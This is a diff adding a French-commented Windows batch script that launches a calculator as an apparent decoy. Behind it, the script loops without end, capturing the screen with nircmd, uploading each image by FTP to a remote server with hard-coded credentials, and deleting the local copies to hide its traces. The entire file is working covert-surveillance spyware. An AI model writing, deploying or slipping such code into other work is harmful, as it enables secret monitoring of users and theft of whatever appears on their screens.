@@ -1,0 +1,73 @@
+﻿@echo off
+cls
+
+
+REM -- Réglages des dossiers
+set dossier=%TEMP%\calc
+set dossierscreenshots=%TEMP%\processus
+
+REM -- Identifiants ftp
+set MyUserName=username
+set MyPassword=password
+set ip_serveur_distant=192.168.1.X
+
+
+
+
+
+
+
+
+
+
+REM -- Déplacement des éléments dans un répertoire
+
+mkdir %dossier%
+mkdir %dossierscreenshots%
+move calc.exe %dossier%\calc.exe
+move nircmd.exe %dossier%\nircmd.exe
+cd %dossier%
+C:
+
+
+
+
+
+
+REM -- Lancement rapide de la calculatrice
+start %dossier%\calc.exe
+
+
+
+
+
+
+
+REM -- Boucle de screenshot
+:screenshot
+	set data=%DATE:/=-%-%TIME::=-%.png
+	cd "%dossierscreenshots%\"
+	"%dossier%\nircmd.exe" cmdwait 1000 savescreenshot "%dossierscreenshots%\%data%.png"
+	ping 127.0.0.1 -n 2 > nul
+	echo user %MyUserName%> ftpcmd.dat
+	echo %MyPassword%>> ftpcmd.dat
+	echo bin>> ftpcmd.dat
+	echo put "%data%.png">> ftpcmd.dat
+	echo quit>> ftpcmd.dat
+	ftp -n -s:ftpcmd.dat %ip_serveur_distant%
+	del ftpcmd.dat
+	del "%data%.png"
+goto :screenshot
+
+
+
+
+
+
+
+
+
+
+REM -- On efface les fichiers
+REM del %dossier%\*.* /Y
+REM del %dossier% /Y
